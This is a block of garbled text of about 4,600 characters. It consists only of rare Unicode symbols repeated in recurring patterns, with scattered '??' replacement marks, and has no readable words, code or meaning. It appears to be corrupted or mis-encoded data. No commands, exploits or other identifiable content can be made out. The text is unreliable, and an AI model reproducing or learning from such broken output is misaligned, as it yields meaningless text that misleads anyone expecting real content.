࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬𞋬𞋬𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛